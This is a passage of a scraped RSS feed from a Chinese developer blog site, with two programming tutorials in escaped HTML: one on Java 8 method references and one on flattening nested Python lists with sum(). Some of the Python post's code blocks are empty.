-<description>&lt;p&gt;　　上一节介绍了Java8新特性中的Lambda表达式，本小节继续讲解Java8的新特性之二：方法引用。方法引用其实也离不开Lambda表达式。&lt;/p&gt;
-&lt;h2&gt;1、方法引用的使用场景&lt;/h2&gt;
-&lt;p&gt;　　我们用Lambda表达式来实现匿名方法。但有些情况下，我们用Lambda表达式仅仅是调用一些已经存在的方法，除了调用动作外，没有其他任何多余的动作，在这种情况下，我们倾向于通过方法名来调用它，而Lambda表达式可以帮助我们实现这一要求，它使得Lambda在调用那些已经拥有方法名的方法的代码更简洁、更容易理解。方法引用可以理解为Lambda表达式的另外一种表现形式。&lt;/p&gt;
-&lt;h2&gt;2、方法引用的分类&lt;/h2&gt;
-&lt;table class=&quot;md-table&quot; frame=&quot;border&quot; rules=&quot;all&quot;&gt;&lt;thead&gt;&lt;tr class=&quot;md-end-block md-focus-container&quot;&gt;&lt;th&gt;&lt;span class=&quot;td-span md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;类型&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;
-&lt;th&gt;&lt;span class=&quot;td-span&quot;&gt;语法&lt;/span&gt;&lt;/th&gt;
-&lt;th&gt;&lt;span class=&quot;td-span&quot;&gt;对应的Lambda表达式&lt;/span&gt;&lt;/th&gt;
-&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;4.5&quot;&gt;&lt;tr class=&quot;md-end-block&quot; readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;静态方法引用&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;类名::staticMethod&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;(args) -&amp;gt; 类名.staticMethod(args)&lt;/span&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;tr class=&quot;md-end-block&quot; readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;实例方法引用&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;inst::instMethod&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;(args) -&amp;gt; inst.instMethod(args)&lt;/span&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;tr class=&quot;md-end-block&quot; readability=&quot;3&quot;&gt;&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;对象方法引用&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;类名::instMethod&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;(inst,args) -&amp;gt; 类名.instMethod(args)&lt;/span&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;tr class=&quot;md-end-block&quot; readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;构建方法引用&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;类名::new&lt;/span&gt;&lt;/td&gt;
-&lt;td&gt;&lt;span class=&quot;td-span&quot;&gt;(args) -&amp;gt; new 类名(args)&lt;/span&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2&gt;3、方法引用举例&lt;/h2&gt;
-&lt;h3&gt;3.1 静态方法引用&lt;/h3&gt;
-&lt;p&gt;　　有一个Person类,如下所示：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;@Data
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Person {
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
-&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
-&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     
-&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer age;
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
-&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compareByAge(Person a, Person b) {
-&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; a.age.compareTo(b.age);
-&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　现假设，一个部门有30人，把他们存放在一个数组中，并按年龄排序，通常我们可以自己写一个比较器，代码如下：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; Person[] rosterAsArray = &lt;span&gt;new&lt;/span&gt; Person[30&lt;span&gt;];
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加数组元素省略&lt;/span&gt;
-&lt;span&gt; 3&lt;/span&gt; 
-&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; PersonAgeComparator &lt;span&gt;implements&lt;/span&gt; Comparator&amp;lt;Person&amp;gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(Person a, Person b) {
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; a.getBirthday().compareTo(b.getBirthday());
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;}
-&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         
-&lt;span&gt;10&lt;/span&gt; Arrays.sort(rosterAsArray, &lt;span&gt;new&lt;/span&gt; PersonAgeComparator());
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　Arrays.sort的声明为：public static &amp;lt;T&amp;gt; void sort(T[] a, Comparator&amp;lt;? super T&amp;gt; c)，比较器参数Comparator为一个函数式接口，利用上一节Lambda表达式所学知识，可以改写为以下代码：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; Person[] rosterAsArray = &lt;span&gt;new&lt;/span&gt; Person[30&lt;span&gt;];
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加数组元素省略&lt;/span&gt;
-&lt;span&gt;3&lt;/span&gt; 
-&lt;span&gt;4&lt;/span&gt; Arrays.sort(rosterAsArray, (a,b) -&amp;gt; a.getAge().compareTo(b.getAge()));
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　然而，你会发现，Perdon类中已经有了一个静态方法的比较器：compareByAge，因此，我们改用Person类已经提供的比较器：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; Person[] rosterAsArray = &lt;span&gt;new&lt;/span&gt; Person[30&lt;span&gt;];
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加数组元素省略&lt;/span&gt;
-&lt;span&gt;3&lt;/span&gt; 
-&lt;span&gt;4&lt;/span&gt; Arrays.sort(rosterAsArray, (a,b) -&amp;gt; Person.compareByAge(a,b));
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　以上代码，因为Lambda表达式调用了一个已经存在的静态方法，根据我们第2节表格中的语法，上面的代码可以最终改写成静态方法引用：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; Person[] rosterAsArray = &lt;span&gt;new&lt;/span&gt; Person[30&lt;span&gt;];
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加数组元素省略&lt;/span&gt;
-&lt;span&gt;3&lt;/span&gt; 
-&lt;span&gt;4&lt;/span&gt; Arrays.sort(rosterAsArray, Person::compareByAge);
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　下面这个例子更简单：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test {
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
-&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;         List&amp;lt;Integer&amp;gt; list = Arrays.asList(82,22,34,50,9&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;        list.sort(Integer::compare);
-&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &lt;span&gt;        System.out.println(list);
-&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　对一个Integer列表进行排序，因为Integer中已经存在静态的比较方法compare()，因此可以直接用静态方法引用的方式来调用 ，运行结果为：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot;&gt;
-&lt;pre&gt;
-[9, 22, 34, 50, 82]
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h3&gt;3.2 实例方法引用&lt;/h3&gt;
-&lt;p&gt;　　实例方法引用，顾名思义就是调用已经存在的实例的方法，与静态方法引用不同的是类要先实例化，静态方法引用类无需实例化，直接用类名去调用。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;@Data
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; User {
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
-&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
-&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer age;
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
-&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; User(String name, Integer age) {
-&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
-&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.age =&lt;span&gt; age;
-&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;}
-&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
-&lt;span&gt;13&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestInstanceReference {
-&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; 
-&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
-&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
-&lt;span&gt;17&lt;/span&gt;         TestInstanceReference test = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; TestInstanceReference();
-&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         User user = &lt;span&gt;new&lt;/span&gt; User(&quot;欧阳峰&quot;,32&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;         Supplier&amp;lt;String&amp;gt; supplier = () -&amp;gt;&lt;span&gt; user.getName();
-&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         System.out.println(&quot;Lambda表达式输出结果：&quot; +&lt;span&gt; supplier.get());
-&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; 
-&lt;span&gt;22&lt;/span&gt;         Supplier&amp;lt;String&amp;gt; supplier2 =&lt;strong&gt;&lt;span&gt; user::getName;
-&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;23&lt;/span&gt;         System.out.println(&quot;实例方法引用输出结果：&quot; +&lt;span&gt; supplier2.get());
-&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　输出结果：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;Lambda表达式输出结果：欧阳峰
-实例方法引用输出结果：欧阳峰&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h3&gt;3.3 对象方法引用&lt;/h3&gt;
-&lt;p&gt;　　若Lambda参数列表中的第一个参数是实例方法的参数调用者，而第二个参数是实例方法的参数时，可以使用对象方法引用。&lt;/p&gt;
-&lt;p&gt;String的equals()方法：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; equals(Object anObject) {
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt; ==&lt;span&gt; anObject) {
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;        }
-&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (anObject &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; String) {
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;             String anotherString =&lt;span&gt; (String)anObject;
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;             &lt;span&gt;int&lt;/span&gt; n =&lt;span&gt; value.length;
-&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (n ==&lt;span&gt; anotherString.value.length) {
-&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;                 &lt;span&gt;char&lt;/span&gt; v1[] =&lt;span&gt; value;
-&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;                 &lt;span&gt;char&lt;/span&gt; v2[] =&lt;span&gt; anotherString.value;
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                 &lt;span&gt;int&lt;/span&gt; i = 0&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;while&lt;/span&gt; (n-- != 0&lt;span&gt;) {
-&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt; (v1[i] !=&lt;span&gt; v2[i])
-&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;                         &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;                     i++&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;                }
-&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;            }
-&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        }
-&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;     }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
-&lt;span&gt;3&lt;/span&gt;    BiPredicate&amp;lt;String,String&amp;gt; bp = (x, y) -&amp;gt;&lt;span&gt; x.equals(y);
-&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;    BiPredicate&amp;lt;String,String&amp;gt; bp1 =&lt;span&gt;&lt;strong&gt;&lt;span&gt; String::equals&lt;/span&gt;&lt;/strong&gt;;
-&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; 
-&lt;span&gt;6&lt;/span&gt;    &lt;span&gt;boolean&lt;/span&gt; test = bp1.test(&quot;xy&quot;, &quot;xx&quot;&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; &lt;span&gt;   System.out.println(test);
-&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　BiPredicate的test()方法接受两个参数，x和y，具体实现为x.equals(y)，满足Lambda参数列表中的第一个参数是实例方法的参数调用者，而第二个参数是实例方法的参数，因此可以使用对象方法引用。&lt;/p&gt;
-&lt;h3&gt;3.4 构造方法引用&lt;/h3&gt;
-&lt;p&gt;　　注意：需要调用的构造器的参数列表要与函数式接口中抽象方法的参数列表保持一致。&lt;/p&gt;
-&lt;p&gt;　　如：要获取一个空的User列表：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;1&lt;/span&gt; Supplier&amp;lt;List&amp;lt;User&amp;gt;&amp;gt; userSupplier = () -&amp;gt; &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();
-&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; List&amp;lt;User&amp;gt; user =&lt;span&gt; userSupplier.get();
-&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; 
-&lt;span&gt;4&lt;/span&gt; Supplier&amp;lt;List&amp;lt;User&amp;gt;&amp;gt; userSupplier2 = ArrayList&amp;lt;User&amp;gt;::&lt;span&gt;new&lt;/span&gt;&lt;span&gt;;    &lt;span&gt;// 构造方法引用写法
-&lt;/span&gt;&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; List&amp;lt;User&amp;gt; user2 = userSupplier.get();
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　至此，方法引用讲完了，下一章节将讲解Stream API。&lt;/p&gt;
-
-
-</description>
-<pubDate>Wed, 17 Apr 2019 15:39:00 +0000</pubDate>
-<dc:creator>无恨之都</dc:creator>
-<og:description>上一节介绍了Java8新特性中的Lambda表达式，本小节继续讲解Java8的新特性之二：方法引用。方法引用其实也离不开Lambda表达式。 1、方法引用的使用场景 我们用Lambda表达式来实现匿名</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/wuhenzhidu/p/10727065.html</dc:identifier>
-</item>
-<item>
-<title>如何给列表降维？sum()函数的妙用 - 豌豆花下猫</title>
-<link>http://www.cnblogs.com/pythonista/p/10727060.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/pythonista/p/10727060.html</guid>
-<description>&lt;p&gt;上个月，学习群里的 S 同学问了个题目，大意可理解为&lt;code&gt;列表降维&lt;/code&gt; ，例子如下：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code class=&quot;hljs ini&quot;&gt;&lt;span class=&quot;hljs-attr&quot;&gt;oldlist = [[&lt;span class=&quot;hljs-number&quot;&gt;1, &lt;span class=&quot;hljs-number&quot;&gt;2, &lt;span class=&quot;hljs-number&quot;&gt;3], [&lt;span class=&quot;hljs-number&quot;&gt;4, &lt;span class=&quot;hljs-number&quot;&gt;5]]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;原始数据是一个二维列表，目的是获取该列表中所有元素的具体值。从抽象一点的角度来理解，也可看作是列表解压或者列表降维。&lt;/p&gt;
-&lt;p&gt;这个问题并不难，但是，怎么写才比较优雅呢？&lt;/p&gt;
-&lt;pre&gt;
-&lt;code class=&quot;hljs ini&quot;/&gt;
-&lt;/pre&gt;
-&lt;p&gt;这种方法简单粗暴，需要拼接什么内容，就取出来直接拼接。然而，如果原列表有很多子列表，则这个方法就会变得繁琐了。&lt;/p&gt;
-&lt;p&gt;我们把原问题升级一下：&lt;strong&gt;一个二维列表包含 n 个一维列表元素，如何优雅地把这些子列表拼成一个新的一维列表？&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;方法一的做法需要写 n 个对象，以及 n - 1 次拼接操作。当然不可行。下面看看方法二：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code class=&quot;hljs bash&quot;/&gt;
-&lt;/pre&gt;
-&lt;p&gt;这个表达式中出现了两个 for 语句，在第一个 for 语句中，我们先取出原列表的长度，然后构造 range 对象，此时 j 的取值范围是 [0, n-1] 的闭区间。&lt;/p&gt;
-&lt;p&gt;在第二个 for 语句中，oldlist[j] 指的正是原列表的第 j 个子列表，&lt;code&gt;for i in oldlist[j]&lt;/code&gt; 则会遍历取出 j 子列表的元素，由于 j 取值的区间正对应于原列表的全部索引值，所以，最终达到解题目的。&lt;/p&gt;
-&lt;p&gt;这种方法足够优雅了，而且理解也并不难。&lt;/p&gt;
-&lt;p&gt;然而，我们是否就能满足于此了呢？有没有其它奇技淫巧，哦不，是其它高级方法呢？F 同学贡献了一个思路：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code class=&quot;hljs ini&quot;/&gt;
-&lt;/pre&gt;
-&lt;p&gt;说实话，这个方法令我大感意外！sum() 函数不是用于求和的么？怎么竟然有此用法？&lt;/p&gt;
-&lt;p&gt;这个写法利用了什么原理呢？由于我开始时不知道 sum() 函数可以接收两个参数，不清楚它们是怎么用于计算的，所以一度很困惑。但是，当我知道 sum() 的完整用法时，我恍然大悟。&lt;/p&gt;
-&lt;p&gt;接下来也不卖关子了，直接揭晓吧。&lt;/p&gt;
-&lt;p&gt;语法： &lt;code&gt;sum(iterable[, start])&lt;/code&gt; ，sum() 函数的第一个参数是可迭代对象，如列表、元组或集合等，第二个参数是起始值，默认为 0 。其用途是以 start 值为基础，再与可迭代对象的所有元素相“加”。&lt;/p&gt;
-&lt;p&gt;在上例中，执行效果是 oldlist 中的子列表逐一与第二个参数相加，而列表的加法相当于 extend 操作，所以最终结果是由 [] 扩充成的列表。&lt;/p&gt;
-&lt;p&gt;这里有两个关键点：&lt;strong&gt;sum() 函数允许带两个参数，且第二个参数才是起点。&lt;/strong&gt; 可能 sum() 函数用于数值求和比较多，然而用于作列表的求和，就有奇效。它比列表推导式更加优雅简洁！&lt;/p&gt;
-&lt;p&gt;至此，前面的升级版问题就得到了很好的回答。简单回顾一下，s 同学最初的问题可以用三种方法实现，第一种方法中规中矩，第二种方法正道进阶，而第三种方法旁门左道（没有贬义，只是说它出人意料，却效果奇佳）。&lt;/p&gt;
-&lt;p&gt;这道并不算难的问题，在众人的讨论与分享后，竟还引出了很有价值的学习内容。前不久，同样是群内的一个问题，也产生了同样的学习效果，详见《&lt;a href=&quot;https://mp.weixin.qq.com/s/4eWQmJ15QZabNViePCDmNw&quot;&gt;Python进阶：如何将字符串常量转为变量？&lt;/a&gt;》。&lt;/p&gt;
-&lt;p&gt;我从中得到了一个启示：&lt;strong&gt;应该多角度地思考问题，设法寻求更优解，同时，基础知识应掌握牢固，并灵活贯通起来。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;学无止境，这里我还想再开拓一下思路，看看能发现些什么。&lt;/p&gt;
-&lt;p&gt;1、如果原列表的元素除了列表，还有其它类型的元素，怎么把同类的元素归并在一起呢？&lt;/p&gt;
-&lt;p&gt;2、如果是一个三维或更高维的列表，怎么更好地把它们压缩成一维列表呢？&lt;/p&gt;
-&lt;p&gt;3、sum() 函数还有什么知识要点呢？&lt;/p&gt;
-&lt;p&gt;前两个问题增加了复杂度，解决起来似乎没有“灵丹妙药”了，只能用笨方法分别拆解，逐一解压。&lt;/p&gt;
-&lt;p&gt;第三个思考题是关于 sum() 函数本身的用法，我们看看官方文档是怎么说的：&lt;/p&gt;
-&lt;blockquote readability=&quot;12.815384615385&quot;&gt;
-&lt;p&gt;The &lt;em&gt;iterable&lt;/em&gt;’s items are normally numbers, and the start value is not allowed to be a string.&lt;/p&gt;
-&lt;p&gt;For some use cases, there are good alternatives to &lt;a href=&quot;https://docs.python.org/3/library/functions.html#sum&quot;&gt;&lt;code&gt;sum()&lt;/code&gt;&lt;/a&gt;. The preferred, fast way to concatenate a sequence of strings is by calling &lt;code&gt;''.join(sequence)&lt;/code&gt;. To add floating point values with extended precision, see &lt;a href=&quot;https://docs.python.org/3/library/math.html#math.fsum&quot;&gt;&lt;code&gt;math.fsum()&lt;/code&gt;&lt;/a&gt;. To concatenate a series of iterables, consider using &lt;a href=&quot;https://docs.python.org/3/library/itertools.html#itertools.chain&quot;&gt;&lt;code&gt;itertools.chain()&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;sum() 的第二个参数不允许是字符串。如果用了，会报错：&lt;/p&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;TypeError: sum() can't sum strings [use ''.join(seq) instead]&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;为什么不建议使用 sum() 来拼接字符串呢？哈哈，文档中建议使用 join() 方法，因为它更快。为了不给我们使用慢的方法，它竟特别限定不允许 sum() 的第二个参数是字符串。&lt;/p&gt;
-&lt;p&gt;文档还建议，在某些使用场景时，不要用 sum() ，例如当以扩展精度对浮点数求和时，推荐使用 &lt;code&gt;math.fsum()&lt;/code&gt; ；当要拼接一系列的可迭代对象时，应考虑使用 &lt;code&gt;itertools.chain()&lt;/code&gt; 。&lt;/p&gt;
-&lt;p&gt;浮点数的计算是个难题，我曾转载过一篇《&lt;a href=&quot;https://mp.weixin.qq.com/s/4Se4j-_N0cXiWvoQSRHp1w&quot;&gt;如何在 Python 里面精确四舍五入？&lt;/a&gt;》，对此有精彩分析。而&lt;code&gt;itertools.chain()&lt;/code&gt; 可以将不同类型的可迭代对象串联成一个更大的迭代器，这在旧文《&lt;a href=&quot;https://mp.weixin.qq.com/s/7MbRCn37fIIN42rLm6ho3g&quot;&gt;Python进阶：设计模式之迭代器模式&lt;/a&gt;》中也有论及。&lt;/p&gt;
-&lt;p&gt;不经意间，sum() 函数的注意事项，竟把 Python 其它的进阶内容都联系起来了。小小的函数，竟成为学习之路上的一个枢纽。&lt;/p&gt;
-&lt;p&gt;前段时间，我还写过 range() 、locals() 和 eval() 等内置函数，也是通过一个问题点，而关联出多个知识点， 获益良多。这些内置函数/类的魔力可真不小啊。&lt;/p&gt;
-&lt;p&gt;本文到此结束，希望对你有所帮助。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;友情提示：&lt;/strong&gt; 本公众号内有限时抽奖活动，送出 Python 书籍 15 本，书目有《Python数据分析与挖掘实战》、《Python语言程序设计》《自学Python编程基础、科学计算及数据分析》《实用机器学习》、《Python程序员面试算法宝典》，活动结束时间为&lt;strong&gt;本月 20 日 18 点&lt;/strong&gt; ，赶快来抽奖啦！详情请戳：&lt;a href=&quot;https://mp.weixin.qq.com/s/8dhLmwKurlKy7y6IHzjzAg&quot;&gt;抽奖送书&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img title=&quot;&quot; src=&quot;http://ww1.sinaimg.cn/large/68b02e3bgy1g08dfkg8sdj2076076t96.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;公众号【&lt;strong&gt;Python猫&lt;/strong&gt;】， 专注Python技术、数据科学和深度学习，力图创造一个有趣又有用的学习分享平台。本号连载优质的系列文章，有喵星哲学猫系列、Python进阶系列、好书推荐系列、优质英文推荐与翻译等等，欢迎关注哦。PS：后台回复“&lt;strong&gt;爱学习&lt;/strong&gt;”，免费获得一份学习大礼包。&lt;/p&gt;
-</description>
-<pubDate>Wed, 17 Apr 2019 15:37:00 +0000</pubDate>
-<dc:creator>豌豆花下猫</dc:creator>
